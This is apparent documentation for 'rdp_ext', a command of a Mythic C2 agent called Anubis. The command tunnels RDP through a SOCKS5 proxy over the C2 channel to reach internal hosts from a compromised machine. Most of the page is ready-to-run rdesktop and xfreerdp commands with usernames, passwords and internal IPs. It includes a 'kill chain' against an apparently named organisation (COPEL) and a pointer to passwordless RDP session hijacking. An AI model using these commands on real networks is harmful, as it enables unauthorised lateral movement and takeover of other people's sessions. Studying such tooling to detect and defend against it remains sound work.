+++
title = "rdp_ext"
chapter = false
weight = 140
hidden = false
+++

## Summary

Establishes RDP access to a host reachable by the agent via the existing Anubis SOCKS5 tunnel — without requiring Python or any C2 tooling on the operator's machine. The command starts the SOCKS5 proxy on the Mythic server, probes the target's RDP port from the agent, and returns ready-to-run connection commands.

- **Platform**: All (agent-side probe is OS-agnostic; useful in Windows and Linux pivots)
- **MITRE ATT&CK**: T1021.001, T1090
- **Version**: 1.0
- **Author**: @wtechsec

### Arguments

#### target *(required)*
- IP or hostname of the RDP target (must be reachable from the agent host).

#### port *(optional, default: 3389)*
- RDP port on the target.

#### username *(optional)*
- RDP username.

#### password *(optional)*
- RDP password.

#### domain *(optional)*
- Windows domain (e.g., `COPEL`).

#### socks_port *(optional, default: 7005)*
- Port to open on the Mythic server for SOCKS5. If already running, the warning is safe to ignore.

## How It Works

```
Operator machine ──► Mythic server :7005 (SOCKS5)
                           │
                     C2 channel (HTTP/TLS)
                           │
                        Agent
                           │
                     target:3389 (RDP)
```

1. **Mythic handler** (`create_go_tasking`): calls `SendMythicRPCProxyStartCommand(PortType="socks", LocalPort=7005)` — Mythic opens a SOCKS5 listener on the server.
2. **Agent task**: opens a TCP socket to `target:3389` with a 5-second timeout to verify reachability before returning connection commands.
3. **Output**: three ready-to-use connection commands for the operator.

## Usage

```
# Modo básico — retorna comandos (sem credenciais)
rdp_ext 10.12.193.4

# Com credenciais
rdp_ext 10.12.193.4 Administrator P@ssw0rd COPEL

# Porta não padrão
rdp_ext {"target":"10.12.193.4","port":33890,"username":"admin","domain":"COPEL","password":"P@ss"}
```

## Output Example

```
[+] TCP 10.12.193.4:3389 — REACHABLE
[+] SOCKS5 iniciado na porta 7005 do servidor Mythic
    (Se já estava rodando, ignore aviso de porta em uso)

╔══ CONFIGURAÇÃO PROXYCHAINS ══════════════════════════════════╗
║  /etc/proxychains4.conf
║  [ProxyList]
║  socks5  127.0.0.1  7005
╚══════════════════════════════════════════════════════════════╝

── rdesktop (via proxychains) ─────────────────────────────────
  proxychains rdesktop 10.12.193.4 -d 'COPEL' -u 'Administrator' -p 'P@ssw0rd' -g 1920x1080 -K

── xfreerdp (via proxychains) ─────────────────────────────────
  proxychains xfreerdp /v:10.12.193.4 /u:Administrator /d:COPEL /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution

── xfreerdp (SOCKS5 nativo — sem proxychains) ─────────────────
  xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4 /u:Administrator /d:COPEL /p:'P@ssw0rd' /cert-ignore +clipboard /dynamic-resolution

[*] Usuário : COPEL\Administrator
[*] Alvo    : 10.12.193.4:3389
```

## Prerequisites (Operator Machine — Kali)

```bash
# xfreerdp (preferido — SOCKS5 nativo)
sudo apt install freerdp2-x11

# rdesktop (alternativa)
sudo apt install rdesktop

# proxychains (apenas se não usar xfreerdp nativo)
sudo apt install proxychains-ng
```

## xfreerdp Native SOCKS5 (Recommended)

xfreerdp supports `/proxy:socks5://` natively — no proxychains configuration needed:

```bash
xfreerdp /proxy:socks5://127.0.0.1:7005 \
  /v:10.12.193.4 \
  /u:Administrator \
  /d:COPEL \
  /p:'P@ssw0rd' \
  /cert-ignore \
  +clipboard \
  /dynamic-resolution \
  /drive:share,/tmp
```

Useful xfreerdp flags:

| Flag | Description |
|---|---|
| `/cert-ignore` | Skip certificate verification (self-signed) |
| `+clipboard` | Enable clipboard sync |
| `/dynamic-resolution` | Resize window dynamically |
| `/drive:share,/tmp` | Mount `/tmp` as a shared drive in RDP session |
| `/bpp:16` | Reduce color depth for low-bandwidth connections |
| `/compression` | Enable compression |

## MITRE ATT&CK

- **T1021.001** — Remote Services: Remote Desktop Protocol
- **T1090** — Proxy (SOCKS5 tunnel via C2)

## Notes

- **No Python required on operator machine**: uses native Kali tools (xfreerdp, rdesktop)
- **Agent agnostic**: the probe and commands work from any Anubis host (Windows, Linux, macOS) that can reach the target
- **SOCKS5 idempotent**: if SOCKS5 is already running on port 7005, the startup warning is safe to ignore — the existing tunnel is reused
- **Probe timeout**: 5 seconds — if the target is slow to respond, use explicit JSON args with an unreachable host to skip probe
- **Combine with `socks stop`** to tear down the tunnel after use

### Full Kill Chain (COPEL)

```
# 1. Anubis ativo em P483078 (host Oracle comprometido)
#    P489039 (Win11, 10.12.193.4) tem RDP habilitado

# 2. No Mythic: inicia SOCKS5 + probe + comandos
rdp_ext 10.12.193.4 da_silva Senha@123 COPEL

# 3. No terminal do operador (Kali):
xfreerdp /proxy:socks5://127.0.0.1:7005 /v:10.12.193.4 \
  /u:da_silva /d:COPEL /p:'Senha@123' /cert-ignore +clipboard

# 4. Alternativa: se sessão da_silva ainda está Disconnected no host
#    → rdp_hijack (agente SYSTEM) para acesso sem senha
rdp_hijack 3
```

---

## Resumo em Português (PT-BR)

Permite acesso RDP a hosts internos via tunnel SOCKS5 do Anubis — sem qualquer ferramenta C2 no operador. O comando inicia o SOCKS5 no servidor Mythic, confirma que o alvo está acessível e retorna os comandos exatos para `rdesktop` e `xfreerdp`.

O método preferido é o `xfreerdp` com suporte nativo a SOCKS5 (`/proxy:socks5://`), eliminando a necessidade do proxychains.

### Quando usar vs rdp_hijack

| Cenário | Comando |
|---|---|
| Credenciais conhecidas, RDP aberto | `rdp_ext <target> <user> <pass> <domain>` |
| Sem credenciais, sessão Disconnected no host | `rdp_hijack <session_id>` (req. SYSTEM) |
| Ambos: hijack + acesso visual externo | `rdp_hijack` primeiro, depois `rdp_ext` para visualizar |
